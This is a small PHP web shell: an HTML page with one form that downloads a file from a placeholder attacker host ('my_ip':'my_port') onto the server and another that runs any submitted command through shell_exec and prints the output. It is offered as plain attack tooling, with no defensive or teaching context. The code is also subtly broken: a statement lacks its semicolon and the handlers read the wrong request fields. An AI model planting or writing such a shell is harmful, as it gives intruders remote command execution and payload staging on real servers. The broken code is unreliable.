<!DOCTYPE html>
<html>
<body>

<form action="" method="POST" enctype="multipart/form-data">
    File:
    <input type="file" name="fileToUpload">
    <input type="submit" value="Upload" name="upload">
</form>
	
<br>
	
<form method="GET">
    CMD:
    <input type="text" name="command">
    <input type="submit" value="Exec" name="cmd">
</form>

<pre>
<?
	$host = "my_ip";
	$port = "my_port"
	if ($_POST['upload']) {
		file_put_contents($_REQUEST['upload'], file_get_contents("http://$host:$port/" . $_REQUEST['upload']));
	};
	if ($_GET['cmd']) {
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
	};
?>
</pre>
</body>
</html>
